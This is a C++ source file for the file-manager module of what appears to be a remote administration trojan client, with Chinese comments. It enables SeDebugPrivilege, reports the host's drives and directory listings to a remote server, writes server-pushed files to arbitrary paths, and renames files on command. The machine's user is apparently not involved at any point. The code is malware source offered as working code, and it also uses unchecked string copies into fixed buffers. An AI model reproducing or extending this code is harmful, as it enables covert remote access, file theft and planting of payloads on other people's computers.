#include "pch.h"
#include "FileManager.h"
#include "ProcessHelper.h"
#include "Common.h"
#pragma warning(disable : 4996)
static __int64 __TransferFileLength = 0;
CFileManager::CFileManager(CIocpClient* IocpClient)
    :CManager(IocpClient)
{
    //回传数据包到服务器

    EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);

    //当前客户端扫描所有正在运行的进程信息

    SendClientVolumeList();
}

CFileManager::~CFileManager()
{
    _tprintf(_T("~CFileManager()\r\n"));
    EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

ULONG CFileManager::SendClientVolumeList()
{
	char	VolumeData[0x500] = { 0 };
	BYTE	BufferData[0x1000] = { 0 };
	char	FileSystemType[MAX_PATH] = { 0 };
	char* Travel = NULL;
	BufferData[0] = CLIENT_FILE_MANAGER_REPLY;


	GetLogicalDriveStrings(sizeof(VolumeData), VolumeData);

	//获得驱动器信息
	//0018F460  43 3A 5C 00 44 3A 5C 00 45 3A 5C 00 46 3A  C:\.D:\.E:\.F:
	//0018F46E  5C 00 47 3A 5C 00 48 3A 5C 00 4A 3A 5C 00  \.G:\.H:\.J:\.

	Travel = VolumeData;
	unsigned __int64	HardDiskAmount = 0;        //HardDisk
	unsigned __int64	HardDiskFreeSpace = 0;
	unsigned long		HardDiskAmountMB = 0;      // 总大小
	unsigned long		HardDiskFreeSpaceMB = 0;   // 剩余空间

	DWORD Offset = 0;
	for (Offset = 1; *Travel != '\0'; Travel += lstrlen(Travel) + 1)   //这里的+1为了过\0
	{
		memset(FileSystemType, 0, sizeof(FileSystemType));  //文件系统 NTFS
		//得到文件系统信息及大小
		GetVolumeInformation(Travel, NULL, 0, NULL, NULL, NULL, FileSystemType, MAX_PATH);
		ULONG	FileSystemTypeLength = lstrlen(FileSystemType) + 1;
		SHFILEINFO	v1;
		SHGetFileInfo(Travel, FILE_ATTRIBUTE_NORMAL, &v1,
			sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		ULONG HardDiskTypeNameLength = lstrlen(v1.szTypeName) + 1;
		//计算磁盘大小
		if (Travel[0] != 'A' && Travel[0] != 'B'
			&& GetDiskFreeSpaceEx(Travel, (PULARGE_INTEGER)&HardDiskFreeSpace,
				(PULARGE_INTEGER)&HardDiskAmount, NULL))
		{
			HardDiskAmountMB = HardDiskAmount / 1024 / 1024;
			HardDiskFreeSpaceMB = HardDiskFreeSpace / 1024 / 1024;
		}
		else
		{
			HardDiskAmountMB = 0;
			HardDiskFreeSpaceMB = 0;
		}
		// 开始赋值
		BufferData[Offset] = Travel[0];                       //盘符
		BufferData[Offset + 1] = GetDriveType(Travel);        //驱动器的类型
															  //磁盘空间描述占去了8字节
		memcpy(BufferData + Offset + 2, &HardDiskAmountMB, sizeof(unsigned long));
		memcpy(BufferData + Offset + 6, &HardDiskFreeSpaceMB, sizeof(unsigned long));

		//0                       1  2       4  4
		//TOKEN_VOLUME_DEVICE_LISTC驱动器类型5030
		// 磁盘卷标名及磁盘类型
		memcpy(BufferData + Offset + 10, v1.szTypeName, HardDiskTypeNameLength);
		memcpy(BufferData + Offset + 10 + HardDiskTypeNameLength, FileSystemType,
			FileSystemTypeLength);

		Offset += 10 + HardDiskTypeNameLength + FileSystemTypeLength;
	}
	return 	m_IocpClient->OnSending((char*)BufferData, Offset);
}

int CFileManager::SendClientFileList(PBYTE DirectoryFullPath)
{
	// 重置传输方式
	//m_TransferMode = TRANSFER_MODE_NORMAL;
	DWORD	Offset = 0; // 位移指针
	char* BufferData = NULL;
	ULONG   BufferLength = 1024 * 10; // 先分配10K的缓冲区

	BufferData = (char*)LocalAlloc(LPTR, BufferLength);
	if (BufferData == NULL)
	{
		return 0;
	}

	char v1[MAX_PATH];
	wsprintf(v1, "%s\\*.*", DirectoryFullPath);
	//v1 = D:\\*.*

	HANDLE FileHandle = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATAA	v2;   //文件扫描
	FileHandle = FindFirstFile(v1, &v2);

	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		BYTE IsToken = CLIENT_FILE_MANAGER_FILE_LIST_REPLY;

		if (BufferData != NULL)
		{

			LocalFree(BufferData);
			BufferData = NULL;
		}
		return m_IocpClient->OnSending((char*)&IsToken, 1);    //当前目录是空

	}


	BufferData[0] = CLIENT_FILE_MANAGER_FILE_LIST_REPLY;
	//1为数据包头部所占字节,最后赋值
	Offset = 1;
	/*
	文件属性	1
	文件名		strlen(filename) + 1 ('\0')
	文件大小	4
	*/
	do
	{
		// 动态扩展缓冲区
		if (Offset > (BufferLength - MAX_PATH * 2))
		{
			BufferLength += MAX_PATH * 2;
			BufferData = (char*)LocalReAlloc(BufferData,
				BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		char* FileName = v2.cFileName;
		if (strcmp(FileName, ".") == 0 || strcmp(FileName, "..") == 0)
		{
			continue;
		}
		//文件属性 1 字节

		//[Flag 1 HelloWorld\0大小 大小 时间 时间 
		//      0 1.txt\0 大小 大小 时间 时间]
		*(BufferData + Offset) = v2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;   //1  0 
		Offset++;
		// 文件名 lstrlen(pszFileName) + 1 字节
		ULONG FileNameLength = strlen(FileName);
		memcpy(BufferData + Offset, FileName, FileNameLength);
		Offset += FileNameLength;
		*(BufferData + Offset) = 0;
		Offset++;
		//文件大小 8 字节
		memcpy(BufferData + Offset, &v2.nFileSizeHigh, sizeof(DWORD));
		memcpy(BufferData + Offset + 4, &v2.nFileSizeLow, sizeof(DWORD));
		Offset += 8;
		// 最后访问时间 8 字节
		memcpy(BufferData + Offset, &v2.ftLastWriteTime, sizeof(FILETIME));
		Offset += 8;
	} while (FindNextFile(FileHandle, &v2));
	ULONG ReturnLength = m_IocpClient->OnSending(BufferData, Offset);
	LocalFree(BufferData);
	FindClose(FileHandle);
	return ReturnLength;
}

void CFileManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
    BYTE IsToken;
    switch (BufferData[0])
    {
    case CLIENT_FILE_MANAGER_FILE_LIST_REQUIRE:
    {
		m_TransferMode = TRANSFER_MODE_NORMAL;
        SendClientFileList((PBYTE)BufferData + 1);   //第一个字节是消息 后面的是路径
        break;
    }
	case CLIENT_FILE_MANAGER_SEND_FILE_INFORMATION:
	{

		CreateReceivedFileInformation(BufferData + 1);
		break;
	}
	case CLIENT_FILE_MANAGER_FILE_DATA:
	{
		WriteReceivedFileData(BufferData + 1, BufferLength - 1);
		break;
	}

	case CLIENT_FILE_MANAGER_SET_TRANSFER_MODE:
	{

		SetTransferMode(BufferData + 1);
		break;
	}
	case CLIENT_FILE_MANAGER_FILE_RENAME_REQUIRE:
	{

		BufferData += 1;
		char* ExistingFileFullPath = NULL;
		char* NewFileFullPath = NULL;
		NewFileFullPath = ExistingFileFullPath = (char*)BufferData;
		NewFileFullPath += strlen((char*)NewFileFullPath) + 1;
		FileRename(ExistingFileFullPath, NewFileFullPath);
		break;
	}
    }
}

VOID CFileManager::CreateReceivedFileInformation(LPBYTE BufferData)
{
	//	//[Flag 0001 0001 E:\1.txt\0 ]
	FILE_SIZE* v1 = (FILE_SIZE*)BufferData;
	// 保存当前正在操作的文件名
	memset(m_FileFullPath, 0,
		sizeof(m_FileFullPath));
	strcpy(m_FileFullPath, (char*)BufferData + 8);  //已经越过消息头了
													 //保存文件长度
	__TransferFileLength =
		(v1->FileSizeHigh * (MAXDWORD + 1)) + v1->FileSizeLow;

	// 创建多层目录
	MakeSureDirectoryPathExists(m_FileFullPath);
	WIN32_FIND_DATA v2;
	HANDLE FileHandle = FindFirstFile(m_FileFullPath, &v2);
	//1 2 3         1  2 3
	if (FileHandle != INVALID_HANDLE_VALUE
		&& m_TransferMode != TRANSFER_MODE_COVER_ALL
		&& m_TransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		//如果有相同的文件
		BYTE	IsToken[1];

		//请求服务该如何处理
		IsToken[0] = CLIENT_FILE_MANAGER_TRANSFER_MODE_REQUIRE;
		m_IocpClient->OnSending((char*)&IsToken, sizeof(IsToken));
	}
	else
	{
		GetServerFileData();                      //如果没有相同的文件就会执行到这里
	}
	FindClose(FileHandle);
}

BOOL CFileManager::MakeSureDirectoryPathExists(char* DirectoryFullPath)
{
	char* Travel = NULL;
	char* BufferData = NULL;
	DWORD DirectoryAttributes;
	__try
	{
		BufferData = (char*)malloc(sizeof(char) * (strlen(DirectoryFullPath) + 1));

		if (BufferData == NULL)
		{
			return FALSE;
		}

		strcpy(BufferData, DirectoryFullPath);

		Travel = BufferData;


		if (*(Travel + 1) == ':')
		{
			Travel++;
			Travel++;
			if (*Travel && (*Travel == '\\'))
			{
				Travel++;
			}
		}
		//深层目录
		while (*Travel)
		{
			if (*Travel == '\\')
			{
				*Travel = '\0';
				DirectoryAttributes = GetFileAttributes(BufferData);   //查看是否是否目录  目录存在吗
				if (DirectoryAttributes == 0xffffffff)
				{
					if (!CreateDirectory(BufferData, NULL))
					{
						if (GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(BufferData);
							return FALSE;
						}
					}
				}
				else
				{
					if ((DirectoryAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(BufferData);
						BufferData = NULL;
						return FALSE;
					}
				}

				*Travel = '\\';
			}

			Travel = CharNext(Travel);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		if (BufferData != NULL)
		{
			free(BufferData);

			BufferData = NULL;
		}

		return FALSE;
	}

	if (BufferData != NULL)
	{
		free(BufferData);
		BufferData = NULL;
	}
	return TRUE;
}

VOID CFileManager::GetServerFileData()
{
	int	TransferMode;
	switch (m_TransferMode)   //如果没有相同的数据是不会进入Case中的
	{
	case TRANSFER_MODE_COVER_ALL:
		TransferMode = TRANSFER_MODE_COVER;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		TransferMode = TRANSFER_MODE_JUMP;   //CreateFile（always open——eixt）
		break;
	default:
		TransferMode = m_TransferMode;   //1.  2 3
	}

	WIN32_FIND_DATA v1;
	HANDLE FileHandle = FindFirstFile(m_FileFullPath, &v1);

	//1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	IsToken[9] = { 0 };
	DWORD	CreationDisposition; //文件打开方式 
	memset(IsToken, 0, sizeof(IsToken));
	IsToken[0] = CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE;
	// 文件已经存在
	if (FileHandle != INVALID_HANDLE_VALUE)
	{

		//覆盖
		if (TransferMode == TRANSFER_MODE_COVER)
		{
			//偏移置0
			memset(IsToken + 1, 0, 8);//0000 0000
									 // 重新创建
			CreationDisposition = CREATE_ALWAYS;    //进行覆盖   

		}
		//传送下一个
		else if (TransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD v1 = -1;  //0000 -1
			memcpy(IsToken + 5, &v1, 4);
			CreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{

		memset(IsToken + 1, 0, 8);  //0000 0000              //没有相同的文件会走到这里
								   // 重新创建
		CreationDisposition = CREATE_ALWAYS;    //创建一个新的文件
	}
	FindClose(FileHandle);

	FileHandle =
		CreateFile
		(
			m_FileFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			CreationDisposition,  //
			FILE_ATTRIBUTE_NORMAL,
			0
		);
	//需要错误处理
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		__TransferFileLength = 0;
		return;
	}
	CloseHandle(FileHandle);


	m_IocpClient->OnSending((char*)&IsToken, sizeof(IsToken));
}

VOID CFileManager::WriteReceivedFileData(LPBYTE BufferData, ULONG BufferLength)
{
	BYTE* Travel;
	DWORD	NumberOfBytesToWrite = 0;
	DWORD	NumberOfBytesWirte = 0;
	int		v3 = 9; //1 + 4 + 4  数据包头部大小，为固定的9
	FILE_SIZE* v1;
	// 得到数据的偏移
	Travel = BufferData + 8;
	v1 = (FILE_SIZE*)BufferData;
	// 得到数据在文件中的偏移
	LONG	FileSizeHigh = v1->FileSizeHigh;
	LONG	FileSizeLow = v1->FileSizeLow;
	NumberOfBytesToWrite = BufferLength - 8;
	HANDLE	FileHandle =
		CreateFile
		(
			m_FileFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			0
		);
	SetFilePointer(FileHandle, FileSizeLow, &FileSizeHigh, FILE_BEGIN);
	// 写入文件
	WriteFile
	(
		FileHandle,
		Travel,
		NumberOfBytesToWrite,
		&NumberOfBytesWirte,
		NULL
	);
	CloseHandle(FileHandle);
	BYTE	IsToken[9];
	IsToken[0] = CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE;
	FileSizeLow += NumberOfBytesWirte;
	memcpy(IsToken + 1, &FileSizeHigh, sizeof(FileSizeHigh));
	memcpy(IsToken + 5, &FileSizeLow, sizeof(FileSizeLow));
	m_IocpClient->OnSending((char*)&IsToken, sizeof(IsToken));
}

VOID CFileManager::SetTransferMode(LPBYTE BufferData)
{
	memcpy(&m_TransferMode, BufferData, sizeof(m_TransferMode));
	GetServerFileData();
}

VOID CFileManager::FileRename(LPCSTR ExistingFileFullPath, LPCSTR NewFileFullPath)
{
	MoveFileA(ExistingFileFullPath, NewFileFullPath);
}
